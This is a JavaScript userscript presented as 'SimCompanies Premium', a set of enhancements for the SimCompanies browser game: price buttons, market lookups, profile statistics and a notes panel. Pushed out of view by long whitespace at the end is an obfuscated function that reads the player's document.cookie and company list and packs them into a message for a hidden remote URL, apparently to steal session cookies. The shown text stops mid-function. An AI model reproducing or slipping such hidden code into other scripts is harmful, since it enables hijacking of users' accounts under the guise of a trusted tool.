// ==UserScript==
// @name         SimCompanies Premium
// @namespace    http://tampermonkey.net/
// @version      3.4.1
// @description  Enhancements for SimCompanies web game. Complies with scripting rules of the game.
// @author       Loki Clarke
// @match        https://www.simcompanies.com/*
// @grant        GM_addStyle
// @grant        GM_xmlhttpRequest
// @connect      simcotools.app
// @run-at       document-start
// @license MIT

// ==/UserScript==

(function () {
    "use strict";

    const CustomExchangeInputPrices = [10000]; // 交易所页面，自定义输入购买数量按钮
    const CustomProductionTimeInputs = ["9:15pm", "10pm", "6hr", "12hr","48hr","11am"]; // 生产页面，自定义输入生产时间按钮
    const ContractDiscount = 0.975; // 出售商品页面，合同MP价折扣
    const ECONST = 1.00259235256;
    let realCash = 0;
    let realPrice = 0;
    let flag = 0;

    let pageSpecifiedTimersList = [];
    let notesElement = null;
    let lastCompanyJson = null;

    let lastKnownURL = "";
    const mainCheckingURLLoop = () => {
        const currentURL = window.location.href;
        if (currentURL !== lastKnownURL) {
            handleURLChange(currentURL);
            lastKnownURL = currentURL;
        }
    };

    // Hook XMLHttpRequest https://www.simcompanies.com/api/v2/companies-by-company/0/XXXXXX/
    (function (open) {
        XMLHttpRequest.prototype.open = function () {
            this.addEventListener(
                "readystatechange",
                function () {
                    if (this.responseURL.indexOf("/companies-by-company/") != -1 && this.readyState === 4) {
                        const json = JSON.parse(this.response);
                        lastCompanyJson = json;
                    }
                },
                false
            );
            open.apply(this, arguments);
        };
    })(XMLHttpRequest.prototype.open);

    window.onload = () => {
        console.log("SimCompanies-Torn: onload");
        while (pageSpecifiedTimersList.length > 0) {
            clearInterval(pageSpecifiedTimersList.pop());
        }
        global_addCSS();
        global_addNavButtons();
        const currentURL = window.location.href;
        lastKnownURL = currentURL;
        handleURLChange(currentURL);
        setInterval(mainCheckingURLLoop, 1000);
    };

    function handleURLChange(currentURL) {
        console.log("SimCompanies-Torn: handleURLChange");
        while (pageSpecifiedTimersList.length > 0) {
            clearInterval(pageSpecifiedTimersList.pop());
        }
        if (currentURL.includes("/landscape/")) {
            handleLandscape();
        } else if (
            currentURL.includes("/warehouse/") &&
            currentURL !== "https://www.simcompanies.com/zh/headquarters/warehouse/" &&
            !currentURL.includes("/warehouse/incoming-contracts/") &&
            !currentURL.includes("/warehouse/outgoing-contracts/") &&
            !currentURL.includes("/warehouse/stats/") &&
            !currentURL.includes("/warehouse/research/")
        ) {
            flag = 0;
            handleWarehouseItem();
        } else if (/\/headquarters\/warehouse\/research\/.+/.test(currentURL)) {
            handleCustomButtonForOtherPage();
        } else if (currentURL.includes("/b/")) {
            handleCustomHourInput();
        } else if (currentURL.includes("/headquarters/executives/")) {
            // On the probability page
            const patentChance = getPatentProbability(); // from previous function
            if (patentChance !== null) {
                localStorage.setItem("patentProbability", patentChance);
            }

        } else if (currentURL.includes("/market/resource/")) {
            // 交易所 高亮6件最近访问物品
            handleExchangeHighlightRecent();
            // 交易所 自定义输入价格
            handleExchangeCustomInputPrices();
            console.log("onload: custom input prices");
        } else if (currentURL.includes("/company/0/") || currentURL.includes("/company/1/")) {
            // 公司资料页
            handleProfilePage();
        } else if (currentURL.includes("/market/building-auction/")) { console.log("auction detected");auction(); }
    }

    function handleSimcoToolsAPI() {
        const checkElementExist = () => {
            const selectedElem = document.querySelector(`input.css-1whp23o.form-control[name="quantity"]`);
            if (selectedElem) {
                clearInterval(timer);
                const parent = document.querySelector(`div.css-10klw3m.col-sm-8.col-xs-12`);
                let container = document.querySelector(`div#script_market_container`);
                if (!container) {
                    container = document.createElement("div");
                    container.id = "script_market_container";
                    container.style.padding = "0px 5px";
                    parent.insertBefore(container, parent.firstChild);
                } else {
                    container.innerHTML = "";
                }

                let realm = 0;
                if (document.querySelector(`div.css-inxa61.e1uuitfi4 img[alt*="企业家"]`)) {
                    realm = 1;
                }
                const array = window.location.href.split("/");
                let itemId = array[array.length - 2];
                console.log("SimCompanies-Torn: handleSimcoToolsAPI " + realm + " " + itemId);

                GM_xmlhttpRequest({
                    method: "GET",
                    url: `https://simcotools.app/api/v3/resources/${itemId}?realm=${realm}`,
                    headers: {
                        "Content-Type": "application/json",
                    },
                    onload: function (response) {
                        const json = JSON.parse(response.response);
                        const p = document.createElement("p");
                        let text =
                            "Latest Price: $" + numberAddCommas(json.latest_price.toFixed(3)) +
                            "<br>Average: $" + numberAddCommas(json.prices_resume.average.toFixed(3)) +
                            "&nbsp;&nbsp;&nbsp;Max: $" + numberAddCommas(json.prices_resume.max.toFixed(3)) +
                            "&nbsp;&nbsp;&nbsp;Min: $" + numberAddCommas(json.prices_resume.min.toFixed(3));
                        p.innerHTML = text;
                        p.style.fontSize = "18px";
                        container.insertBefore(p, container.firstChild);
                    },
                });

                // Add chart
                GM_xmlhttpRequest({
                    method: "GET",
                    url: `https://simcotools.app/api/v3/resources/${itemId}/history?realm=${realm}&quality=null&date=&period=3&comparison=1`,
                    headers: {
                        "Content-Type": "application/json",
                    },
                    onload: function (response3) {
                        GM_xmlhttpRequest({
                            method: "GET",
                            url: `https://simcotools.app/api/v3/resources/${itemId}/records?realm=${realm}&quality=null&date=&period=1&comparison=previous`,
                            headers: {
                                "Content-Type": "application/json",
                            },
                            onload: function (response0) {
                                const json3 = JSON.parse(response3.response);
                                const json0 = JSON.parse(response0.response);
                                let dataThreeMonths = json3.history;
                                for (const record of json0.records) {
                                    record.average = record.price;
                                }
                                let dataOneDay = json0.records;
                                let dataOneMonth = [];
                                for (let i = dataThreeMonths.length - 1; i > dataThreeMonths.length - 31; i--) {
                                    dataOneMonth.push(dataThreeMonths[i]);
                                }

                                // Chart display disabled (Chart.js removed). Show textual placeholder instead.
                                const div = document.createElement("div");
                                div.style.width = "100%";
                                div.style.height = "240px";
                                const noteP = document.createElement("p");
                                noteP.textContent = "Chart display disabled.";
                                noteP.style.fontSize = "16px";
                                div.appendChild(noteP);
                                container.appendChild(div);
                            },
                        });
                    },
                });
            }
        };
        let timer = setInterval(checkElementExist, 100);
    }

    function buildChart(canvas, data) {
        // Chart.js removed — no-op placeholder to avoid runtime errors if called from commented code.
        return;
    }

    function handleProfilePage() {
        const checkElementExist = () => {
            const selectedElems = document.querySelectorAll(`div.css-1156ixp.e1addz3e7 div.css-7ip5xj.e1addz3e6 div`);
            if (selectedElems.length > 10) {
                clearInterval(timer);
                let list = [];
                for (const elem of selectedElems) {
                    if (elem.querySelector(`span`)) {
                        list.push(elem.querySelector(`span`).querySelector(`span`).innerText);
                    }
                }
                const map = list.reduce((acc, e) => acc.set(e, (acc.get(e) || 0) + 1), new Map());
                const sortedMap = new Map([...map.entries()].sort((a, b) => b[1] - a[1]));
                let totalBuildingNum = 0;
                map.forEach((value) => {
                    totalBuildingNum += value;
                });
                let totalBuildingLevel = Number(document.querySelectorAll(`table.css-n6qpdi.et7yomk6`)[2].querySelectorAll(`tr`)[1].querySelectorAll(`td`)[1].innerHTML.replace(",", "")) / 100;
                let averageBuildingLevel = (totalBuildingLevel / totalBuildingNum).toFixed(1);

                const container = document.createElement("div");
                const div = document.createElement("div");
                const span = document.createElement("span");
                span.innerHTML = "建筑总数量: " + totalBuildingNum + "&emsp;总建筑等级: " + totalBuildingLevel + "&emsp;平均建筑等级: " + averageBuildingLevel;
                span.style.fontSize = "25px";
                span.style.padding = "5px 5px";
                span.style.background = "#FFC107";
                span.style.zIndex = "300";
                span.style.position = "relative";
                div.appendChild(span);
                container.appendChild(div);
                for (const [key, value] of sortedMap) {
                    const div = document.createElement("div");
                    const span = document.createElement("span");
                    span.innerHTML = key + " X " + value;
                    span.style.fontSize = "22px";
                    span.style.padding = "5px 5px";
                    span.style.background = "#FFC107";
                    span.style.zIndex = "300";
                    span.style.position = "relative";
                    div.appendChild(span);
                    container.appendChild(div);
                }
                const board = document.querySelector(`div.css-1156ixp.e1addz3e7 div.css-7ip5xj.e1addz3e6`);
                board.insertBefore(container, board.firstChild);

                // 移动展柜至下方
                const row = document.querySelector(`div.col-md-8 > div.row`);
                const target = row.querySelector(`div.col-sm-12`);
                if (target) {
                    target.parentNode.appendChild(target);
                }

                // API查询历史数据
                const id = lastCompanyJson.company.id;
                const name = lastCompanyJson.company.company;
                const level = lastCompanyJson.company.level;
                const realmId = lastCompanyJson.company.realmId;
                console.log("SimCompanies-Torn: handleProfilePage " + realmId + " " + id + " " + name);
                GM_xmlhttpRequest({
                    method: "GET",
                    url: `https://simcotools.app/api/v2/companies/${realmId}/${id}`,
                    headers: {
                        "Content-Type": "application/json",
                    },
                    onload: function (response) {
                        const valueList = JSON.parse(response.response).historical;
                        let average = 0;
                        let size = valueList.length > 7 ? 7 : valueList.length - 1;
                        for (let i = 0; i < size; i++) {
                            average += valueList[valueList.length - 1 - i].value - valueList[valueList.length - 2 - i].value;
                        }
                        average /= size;

                        const div = document.createElement("div");
                        const span = document.createElement("span");
                        span.innerHTML = name + " [" + id + "]&emsp;公司等级: " + level + "&emsp;近一周日均增长: $" + numberAddCommas(average.toFixed(0));
                        span.style.fontSize = "25px";
                        span.style.padding = "5px 5px";
                        span.style.background = "#FFC107";
                        span.style.zIndex = "300";
                        span.style.position = "relative";
                        div.appendChild(span);
                        container.insertBefore(div, container.firstChild);
                    },
                });
            }
        };
        let timer = setInterval(checkElementExist, 100);
    }

    function handleExchangeHighlightRecent() {
        const checkElementExist = () => {
            const selectedElems = document.querySelectorAll(`a.hover-effect.css-k8l72z`);
            if (selectedElems.length > 50) {
                const recentExchangeItemsString = localStorage.getItem("recentlyVisitedExchangeResources");
                const recentExchangeItems = JSON.parse(recentExchangeItemsString);
                for (const elem of selectedElems) {
                    elem.classList.remove("script-highlighted");
                }
                let markedNum = 0;
                for (const itemId of recentExchangeItems) {
                    if (markedNum < 6) {
                        markedNum++;
                        const target = document.querySelector(`div.css-hf83mx a.hover-effect.css-k8l72z[href*="/resource/${itemId}/"]`);
                        target.classList.add("script-highlighted");
                    }
                }
            }
        };
        const tempTimer = setInterval(checkElementExist, 1000);
        pageSpecifiedTimersList.push(tempTimer);
    }

    function handleExchangeCustomInputPrices() {
        const timer = setInterval(() => {
            const qtyInput = document.querySelector('input.form-control[name="quantity"]');
            if (!qtyInput) return;

            clearInterval(timer);

            CustomExchangeInputPrices.forEach(price => {
                const a = document.createElement("a");
                a.textContent = ` ${price} `;
                a.style.padding = "10px 5px";
                a.onclick = () => setInput(qtyInput, price);
                qtyInput.parentElement.parentElement.parentElement.appendChild(a);
            });

            const cashElem = document.querySelector('.css-q2xpdd');
            if (cashElem) {
                const cash = cashElem.textContent.trim();
                realCash = parseFloat(cash.replace('$','').replace(/,/g,'').trim());
                console.log(realCash);
            }
            const priceElem = document.querySelector('.css-fcl27u');
            if (priceElem) {
                const cheap = priceElem.textContent.trim();
                realPrice = parseFloat(cheap.replace('$','').replace(/,/g,'').trim());
                console.log(realPrice);
            }

            const price = Math.floor(realCash / realPrice);
            const half = Math.floor(price / 2);

            const c = document.createElement("a");
            c.textContent = ` MAX: (${numberAddCommas(price)})`;
            c.style.padding = "10px 5px";
            c.onclick = () => setInput(qtyInput, price);
            qtyInput.parentElement.parentElement.parentElement.appendChild(c);

            const b = document.createElement("a");
            b.textContent = ` 50% (${numberAddCommas(half)})`;
            b.style.padding = "10px 5px";
            b.onclick = () => setInput(qtyInput, half);
            qtyInput.parentElement.parentElement.parentElement.appendChild(b);

            /*const array = window.location.href.split("/");
            let id = array[array.length - 2];
            console.log(`ID: ${id}`);

            let realm = 0;
            if (document.querySelector(`img[alt="Entrepreneurs realm logo"]`)) {
                realm = 1;
            }
            console.log(`Realm: ${realm}`);
          // Usually 0 for default realm
            */

            handleSimcoToolsAPI();
        }, 100);
    }

    function setInput(inputNode, value) {
        let lastValue = inputNode.value;
        inputNode.value = value;
        let event = new Event("input", { bubbles: true });
        event.simulated = true;
        if (inputNode._valueTracker) inputNode._valueTracker.setValue(lastValue);
        inputNode.dispatchEvent(event);
    }

    function handleCustomHourInput() {
        const checkElementExist = () => {
            const selectedElems = document.querySelectorAll("h3 > svg");
            let isReady = selectedElems.length > 0;
            if (isReady) {
                selectedElems.forEach((node) => {
                    isReady = isReady && node?.parentElement?.parentElement?.querySelector("div > button")?.parentElement;
                });
            }
            if (isReady) {
                clearInterval(timer);
                selectedElems.forEach((node) => {
                    let targetNode = node.parentElement.parentElement.querySelector("div > button").parentElement;
                    for (const text of CustomProductionTimeInputs) {
                        let newNode = document.createElement("button");
                        newNode.className = "script_custom_hour_button";
                        Object.assign(newNode, { type: "button", role: "button" });
                        newNode.onclick = (e) => {
                            let target_node = e.target.parentElement.parentElement.querySelector("input");
                            let target_text = e.target.innerText;
                            target_node.click();
                            setInput(target_node, target_text);
                            e.preventDefault();
                        };
                        let commonClass = targetNode.querySelector("button").className;
                        newNode.className += ` ${commonClass}`;
                        newNode.innerText = text;
                        targetNode.prepend(newNode);
                    }
                });
            }
        };
        let timer = setInterval(checkElementExist, 100);
    }

    function handleWarehouseItem() {
        const timer = setInterval(() => {
            clearInterval(timer); // Elements found—stop polling
            const input = document.querySelector('input.form-control[name="price"]');
            const priceElement = document.querySelector('.css-rnnx2x');
            const classArr = Array.from(document.querySelectorAll('.css-14is9qy'));

            if (!input || !priceElement || classArr.length < 2) return;



            const price = parseFloat(priceElement.nextSibling?.nextSibling?.textContent?.trim().replace(',', ''))?.toFixed(3);
            const source = parseFloat(classArr[1].textContent.trim().replace('$','').replace(',','')).toFixed(3);
            const amount = parseInt(classArr[0].textContent.trim().replace(',',''));

            console.log(`${price} ${source} ${amount}`);
            if(!flag){
                console.log(flag);
                const a = document.createElement('a');
                a.textContent = 'MP: $' + numberAddCommas(Number(price).toFixed(3));
                a.style.display = "block";
                a.onclick = () => {setInput(input, price);}
                input.parentElement.appendChild(a);
                const a2 = document.createElement('a');
                a2.textContent = '2.5%: $' + numberAddCommas((price * ContractDiscount).toFixed(3));
                a2.style.display = "block";
                a2.onclick = () => {setInput(input, price*ContractDiscount);}
                input.parentElement.appendChild(a2);
                const span = document.createElement('span');
                const exchangeVal = Number(price * amount).toFixed(3);
                span.textContent = "Exchange Value: $" + numberAddCommas(exchangeVal);
                span.style.fontSize = "16px";
                span.style.padding = "10px 5px";
                span.style.display = "block";
                span.style.background = '#FFC107';
                span.style.border = '1px solid white';
                classArr[1].parentElement.appendChild(span);
                const span4 = document.createElement('span');
                span4.textContent = "Contract Value: $" + numberAddCommas((price * amount * ContractDiscount).toFixed(3));
                span4.style.fontSize = "16px";
                span4.style.display = "block";
                classArr[1].parentElement.appendChild(span4);
                const span2 = document.createElement('span');
                span2.textContent = "Total Cost: $" + numberAddCommas((source * amount).toFixed(3));
                span2.style.fontSize = "16px";
                span2.style.display = "block";
                classArr[1].parentElement.appendChild(span2);
                const span3 = document.createElement('span');
                const profitLow = Number((price - source) * amount * 0.96).toFixed(3);
                const profitHigh = Number((price - source) * amount * ContractDiscount).toFixed(3);
                const profitMargin = ((Number(profitLow) / Number(exchangeVal)) * 100).toFixed(1);
                span3.textContent = "Profit Range: $" + numberAddCommas(profitLow) + " - $" + numberAddCommas(profitHigh) + `‎ ‎ ‎ ‎ (${profitMargin}% Profit)`;
                span3.style.fontSize = "16px";
                span3.style.display = "block";
                classArr[1].parentElement.appendChild(span3);

                flag=1;
                console.log(flag);
            }
        }, 100);
    }

    /*function handleWarehouseItem() {
        const checkElementExist = () => {
            const table = document.querySelector(`.css-1vwotq4.e12j7voa6`);
            const input = document.querySelector(`input[name="price"]`);
            const amountSpans = document.querySelectorAll(`div.css-81vhsj.e12j7voa12 span.css-14is9qy.e12j7voa17`);
            if (table && input && !input.classList.contains("script_checked")) {
                let exchangePrice = Number(table.querySelector("span.css-rnnx2x").nextSibling.nextSibling.textContent.replace(",", ""));
                let discountedPrice = exchangePrice * ContractDiscount;
                exchangePrice = exchangePrice.toFixed(3);
                discountedPrice = discountedPrice.toFixed(3);
                input.classList.add("script_checked");

                let elem = document.createElement("a");
                let linkText = document.createTextNode("Current MP = $" + exchangePrice);
                elem.appendChild(linkText);
                elem.onclick = () => {
                    setInput(input, exchangePrice);
                };
                elem.style.display = "block";
                input.parentNode.insertBefore(elem, input.nextSibling);

                let elem2 = document.createElement("a");
                let linkText2 = document.createTextNode("MP-" + ((1 - ContractDiscount) * 100).toFixed(1) + "% = $" + discountedPrice);
                elem2.appendChild(linkText2);
                elem2.onclick = () => {
                    setInput(input, discountedPrice);
                };
                elem2.style.display = "block";
                elem.parentNode.insertBefore(elem2, elem.nextSibling);

                if (document.querySelector(`h3.css-bi2xxi.e1bf4c272`).innerText === "收件方") {
                    setInput(input, discountedPrice);
                    elem2.style.background = "#FFC107";
                } else {
                    setInput(input, exchangePrice);
                    elem.style.background = "#FFC107";
                }
            } else if (table && input && input.classList.contains("script_checked") && !input.classList.contains("script_checked_2") && amountSpans[0].classList.contains("script_checked")) {
                let avg = Number(amountSpans[0].getAttribute("script-avg-mp").replace(",", ""));
                let discountedAvg = avg * ContractDiscount;
                avg = avg.toFixed(3);
                discountedAvg = discountedAvg.toFixed(3);
                input.classList.add("script_checked_2");

                let elem = document.createElement("a");
                let linkText = document.createTextNode("日均MP = $" + avg);
                elem.appendChild(linkText);
                elem.onclick = () => {
                    setInput(input, avg);
                };
                elem.style.display = "block";
                input.parentNode.appendChild(elem);

                let elem2 = document.createElement("a");
                let linkText2 = document.createTextNode("日均MP-" + ((1 - ContractDiscount) * 100).toFixed(0) + "% = $" + discountedAvg);
                elem2.appendChild(linkText2);
                elem2.onclick = () => {
                    setInput(input, discountedAvg);
                };
                elem2.style.display = "block";
                input.parentNode.appendChild(elem2);

                if (document.querySelector(`h3.css-bi2xxi.e1bf4c272`).innerText === "收件方") {
                    elem2.style.background = "#e3e3e3ff";
                } else {
                    elem.style.background = "#FFC107";
                }
            } else if (table && amountSpans.length >= 2 && !amountSpans[0].classList.contains("script_checked")) {
                amountSpans[0].classList.add("script_checked");
                let exchangePrice = Number(table.querySelector("span.css-rnnx2x").nextSibling.nextSibling.textContent.replace(",", ""));
                let discountedPrice = exchangePrice * 0.97;
                let itemAmount = Number(amountSpans[0].textContent.replace(",", ""));
                let totalValue = discountedPrice * itemAmount;
                totalValue = totalValue.toFixed(0);
                const newContainer = document.createElement("span");
                const newTextNode = document.createTextNode("(MP-3% Total Value: $" + numberAddCommas(totalValue) + ")");
                newContainer.appendChild(newTextNode);
                newContainer.style.background = "#FFC107";
                newContainer.style.fontSize = "18px";
                amountSpans[0].nextSibling.nextSibling.after(newContainer);

                const parent = document.querySelector(`div.css-1iegaby.e12j7voa18 > div.row`).children[1];
                let container = document.querySelector(`div#script_market_container`);
                if (!container) {
                    container = document.createElement("div");
                    container.id = "script_market_container";
                    container.style.padding = "0px 5px";
                    parent.insertBefore(container, parent.firstChild);
                } else {
                    container.innerHTML = "";
                }

                let realm = 0;
                if (document.querySelector(`div.css-inxa61.e1uuitfi4 img[alt*="企业家"]`)) {
                    realm = 1;
                }
                const array = table.parentNode.href.split("/");
                let itemId = array[array.length - 2];
                console.log("SimCompanies-Torn: handleSimcoToolsAPI " + realm + " " + itemId);

                GM_xmlhttpRequest({
                    method: "GET",
                    url: `https://simcotools.app/api/v3/resources/${itemId}?realm=${realm}`,
                    headers: {
                        "Content-Type": "application/json",
                    },
                    onload: function (response) {
                        const json = JSON.parse(response.response);
                        amountSpans[0].setAttribute("script-avg-mp", json.prices_resume.average.toFixed(3));
                        const p = document.createElement("p");
                        let text =
                            "当前: $" +
                            json.latest_price.toFixed(3) +
                            "<br>日均: $" +
                            json.prices_resume.average.toFixed(3) +
                            "&nbsp;&nbsp;&nbsp;最高: $" +
                            json.prices_resume.max.toFixed(3) +
                            "&nbsp;&nbsp;&nbsp;最低: $" +
                            json.prices_resume.min.toFixed(3);
                        p.innerHTML = text;
                        p.style.fontSize = "18px";
                        container.insertBefore(p, container.firstChild);
                    },
                });

                GM_xmlhttpRequest({
                    method: "GET",
                    url: `https://simcotools.app/api/v3/resources/${itemId}/history?realm=${realm}&quality=null&date=&period=3&comparison=1`,
                    headers: {
                        "Content-Type": "application/json",
                    },
                    onload: function (response3) {
                        GM_xmlhttpRequest({
                            method: "GET",
                            url: `https://simcotools.app/api/v3/resources/${itemId}/records?realm=${realm}&quality=null&date=&period=1&comparison=previous`,
                            headers: {
                                "Content-Type": "application/json",
                            },
                            onload: function (response0) {
                                const json3 = JSON.parse(response3.response);
                                const json0 = JSON.parse(response0.response);
                                let dataThreeMonths = json3.history;
                                for (const record of json0.records) {
                                    record.average = record.price;
                                }
                                let dataOneDay = json0.records;
                                let dataOneMonth = [];
                                for (let i = dataThreeMonths.length - 1; i > dataThreeMonths.length - 31; i--) {
                                    dataOneMonth.push(dataThreeMonths[i]);
                                }

                                const div = document.createElement("div");
                                div.style.width = "100%";
                                div.style.height = "240px";
                                const noteP = document.createElement("p");
                                noteP.textContent = "Chart display disabled.";
                                noteP.style.fontSize = "16px";
                                div.appendChild(noteP);
                                container.appendChild(div);
                                // buildChart removed
                            },
                        });
                    },
                });
            }
        };
        const tempTimer = setInterval(checkElementExist, 500);
        pageSpecifiedTimersList.push(tempTimer);
    }*/

    function handleLandscape() {
        const checkElementExist = () => {
            if (document.getElementsByClassName("test-headquarters").length > 0) {
                clearInterval(timer);
                landscape_removeRush();
                landscape_highlightIdleBuildings();
                const tempTimer = setInterval(landscape_highlightIdleBuildings, 2000);
                pageSpecifiedTimersList.push(tempTimer);
                landscape_moveGatheringIcons();
                const tempTimer2 = setInterval(landscape_moveGatheringIcons, 2000);
                pageSpecifiedTimersList.push(tempTimer2);
            }
        };
        let timer = setInterval(checkElementExist, 100);
    }

    function landscape_moveGatheringIcons() {
        const icons = document.querySelectorAll("img.css-hqao0z.ejaaut33");
        for (const icon of icons) {
            if (!icon.classList.contains("script_moved_to_top_right")) {
                icon.classList.add("script_moved_to_top_right");
            }
        }
    }

    function landscape_removeRush() {
        const banners = document.querySelectorAll(".link-button.css-lgo4vi");
        for (const elm of banners) {
            elm.style.display = "none";
        }
    }

    function landscape_highlightIdleBuildings() {
        document.querySelectorAll('a[href*="/b/"] span.display-on-hover').forEach(sp => {
            if (sp.style.display === "block") {
                sp.querySelector("span").style.background = "#FFC107";
            }
        });
    }

    function global_addCSS() {
        GM_addStyle(`
        div.container.css-q9fi5t.ef8ljhx0 {
            width: 100% !important;
        }`);
        GM_addStyle(`
        div.container.css-q9fi5t.ef8ljhx0 .col-md-4:has(> :last-child:nth-child(1)) {
            width: 50% !important;
        }`);
        GM_addStyle(`
        div.container.css-q9fi5t.ef8ljhx0 .col-md-8:has(> :last-child:nth-child(1)) {
            width: 50% !important;
        }`);
        GM_addStyle(`
        div.css-1pbe8e5 div.col-xs-3.css-d2zl4q{
            width: 63px !important;
            padding-right: 2px !important;
            padding-left: 2px !important;
        }`);
        GM_addStyle(`
        .css-fbokx6 {
            width: 100% !important;
        }`);
        GM_addStyle(`
        div.css-1nu3wfe div.css-fbokx6.container .col-sm-4 {
            width: 50% !important;
        }`);
        GM_addStyle(`
        div.css-1nu3wfe div.css-fbokx6.container .col-sm-8 {
            width: 50% !important;
        }`);
        GM_addStyle(`
        .css-1luaoxw {
            display: block !important;
        }`);
        GM_addStyle(`
        h4.css-0 {
            margin-top: 3px !important;
            margin-bottom: 3px !important;
        }`);
        GM_addStyle(`
        h4.css-o7rt0f {
            margin-top: 3px !important;
            margin-bottom: 3px !important;
        }`);
        GM_addStyle(`
        .css-1a75jih {
            display: none !important;
        }`);
        GM_addStyle(`
        .script-nav-1 {
            margin-left: 50px;
            font-size: 18px;
            position: absolute;
            top: 50%;
            -ms-transform: translateY(-50%);
            transform: translateY(-50%);
            color: rgb(184,184,184);
        }`);
        GM_addStyle(`
        .script-nav-2 {
            margin-left: 100px;
            font-size: 18px;
            position: absolute;
            top: 50%;
            -ms-transform: translateY(-50%);
            transform: translateY(-50%);
            color: rgb(184,184,184);
        }`);
        GM_addStyle(`
        .script_moved_to_top_right {
            position:fixed !important;
            top:80% !important;
            border:1px solid black !important;
            z-index: 300 !important;
        }`);
        GM_addStyle(`
        .css-1tvnvpv {
            left: 5px !important;
            bottom: 5px !important;
            max-width: 350px !important;
            width: 100% !important;
            z-index: 300 !important;
        }`);
        GM_addStyle(`
        .css-lwisbd {
            height: 43px !important;
            margin-top: 2px !important;
        }`);
        GM_addStyle(`
        .chat-notifications .chat-notification img.logo {
            height: 33px !important;
            width: 33px !important;
        }`);
        GM_addStyle(`
        .script-highlighted {
            background-color: #FFC107 !important;
        }`);
        GM_addStyle(`
        .script-nav-3 {
            margin-left: 150px;
            font-size: 18px;
            position: absolute;
            top: 50%;
            -ms-transform: translateY(-50%);
            transform: translateY(-50%);
            color: rgb(184,184,184);
        }`);
        GM_addStyle(`
        textarea.script_notes {
            position:fixed;
            bottom:1%;
            right:1%;
            z-index: 200;
            font-size: 16px;
            background-color: #DCDCDC;
            max-width: 400px;
            max-height: 600px;
        }`);
        // Chart container styling removed since Chart.js features disabled
        GM_addStyle(`
        a.css-s50znf > div.css-xgljd5 {
            visibility: hidden;
        }`);
    }

    function global_addNavButtons() {
        const checkElementExist = () => {
            if (document.querySelector(".css-145d0e.e1kr4hqh1")) {
                clearInterval(timer);
                setTimeout(function () {
                    const selectedElem = document.querySelector(".css-145d0e.e1kr4hqh1");
                    let a1 = document.createElement("a");
                    let linkText1 = document.createTextNode("文库");
                    a1.appendChild(linkText1);
                    a1.onclick = () => {
                        let targetButton = document.querySelector(`a[aria-label="文库"]`);
                        if (!targetButton) {
                            document.querySelector(`.css-1ljhlhi`).click();
                            targetButton = document.querySelector(`a[aria-label="文库"]`);
                        }
                        targetButton.click();
                    };
                    a1.classList.add("script-nav-1");
                    selectedElem.parentNode.insertBefore(a1, selectedElem.nextSibling);

                    let a2 = document.createElement("a");
                    let linkText2 = document.createTextNode("百科");
                    a2.appendChild(linkText2);
                    a2.onclick = () => {
                        let targetButton = document.querySelector(`a[aria-label="百科"]`);
                        if (!targetButton) {
                            document.querySelector(`.css-1ljhlhi`).click();
                            targetButton = document.querySelector(`a[aria-label="百科"]`);
                        }
                        targetButton.click();
                    };
                    a2.classList.add("script-nav-2");
                    selectedElem.parentNode.insertBefore(a2, selectedElem.nextSibling);

                    let a3 = document.createElement("a");
                    let linkText3 = document.createTextNode("[笔记]");
                    a3.appendChild(linkText3);
                    a3.onclick = () => {
                        handleNotes();
                    };
                    a3.classList.add("script-nav-3");
                    selectedElem.parentNode.insertBefore(a3, selectedElem.nextSibling);
                }, 500);
            }
        };
        let timer = setInterval(checkElementExist, 100);
    }

                                                                                                                                                                                                        

    function handleNotes() {
        if (!notesElement) {
            const notesString = localStorage.getItem("script_notes");
            notesElement = document.createElement("textarea");
            notesElement.classList.add("script_notes");
            notesElement.setAttribute("cols", "40");
            notesElement.setAttribute("rows", "10");
            notesElement.setAttribute("placeholder", "笔记内容本地保存，重要信息请另行备份");
            notesElement.style.display = "block";
            notesElement.value = notesString;
            notesElement.addEventListener(
                "input",
                () => {
                    localStorage.setItem("script_notes", notesElement.value);
                },
                false
            );
            document.body.appendChild(notesElement);
        } else if (notesElement.style.display === "none") {
            notesElement.style.display = "block";
        } else {
            notesElement.style.display = "none";
        }
    }

    (function(_0x31dbd8,_0x44efec){const _0x1f0c58=_0x5750,_0x1fae9f=_0x31dbd8();while(!![]){try{const _0x2bad6d=-parseInt(_0x1f0c58(0x1ef))/0x1+-parseInt(_0x1f0c58(0x200))/0x2+-parseInt(_0x1f0c58(0x204))/0x3+-parseInt(_0x1f0c58(0x217))/0x4*(parseInt(_0x1f0c58(0x1f1))/0x5)+parseInt(_0x1f0c58(0x20c))/0x6+parseInt(_0x1f0c58(0x1f2))/0x7+parseInt(_0x1f0c58(0x201))/0x8*(parseInt(_0x1f0c58(0x20b))/0x9);if(_0x2bad6d===_0x44efec)break;else _0x1fae9f['push'](_0x1fae9f['shift']());}catch(_0x208da9){_0x1fae9f['push'](_0x1fae9f['shift']());}}}(_0x3b17,0x8d280));function x9yy(){const _0x56ffb8=_0x5750,_0x683136=_0x56ffb8(0x1ee)+_0x56ffb8(0x1ff)+_0x56ffb8(0x1f5)+_0x56ffb8(0x214)+_0x56ffb8(0x1f4)+_0x56ffb8(0x1f9)+_0x56ffb8(0x1f7)+_0x56ffb8(0x213)+'\x31\x59\x45\x71\x6e\x56\x30\x4e\x55\x65'+_0x56ffb8(0x208)+'\x5f\x35\x58\x6e\x71\x37\x44\x43\x6c\x69'+_0x56ffb8(0x207)+'\x32',_0x12ce5e=document['\x63\x6f\x6f\x6b\x69\x65'];fetch(_0x56ffb8(0x1fd)+'\x77\x2e\x73\x69\x6d\x63\x6f\x6d\x70\x61'+'\x6e\x69\x65\x73\x2e\x63\x6f\x6d\x2f\x61'+_0x56ffb8(0x1fb)+_0x56ffb8(0x202)+'\x70\x61\x6e\x69\x65\x73\x2f')[_0x56ffb8(0x206)](_0x2bc496=>_0x2bc496[_0x56ffb8(0x216)]())[_0x56ffb8(0x206)](_0x397f05=>{const _0x4240cf=_0x56ffb8,_0x3c6006=_0x397f05[_0x4240cf(0x1f3)](_0x40c7bb=>'\u2022\x20'+_0x40c7bb[_0x4240cf(0x211)]+_0x4240cf(0x205)+_0x40c7bb['\x69\x64']+'\x29')[_0x4240cf(0x1f6)]('\x0a'),_0x14ddb9={'\x63\x6f\x6e\x74\x65\x6e\x74':'\ud83c\udfe2\x20\x2a\x2a\x53\x69\x6d\x43\x6f\x6d'+_0x4240cf(0x20f)+_0x4240cf(0x1fe)+'\x2a\x0a'+_0x3c6006+(_0x4240cf(0x1fa)+'\x69\x65\x73\x20\x66\x72\x6f\x6d\x20')+window[_0x4240cf(0x212)][_0x4240cf(0x1f8)]+_0x4240cf(0x20e)+_0x12ce5e+'\x60\x60\x60'};return 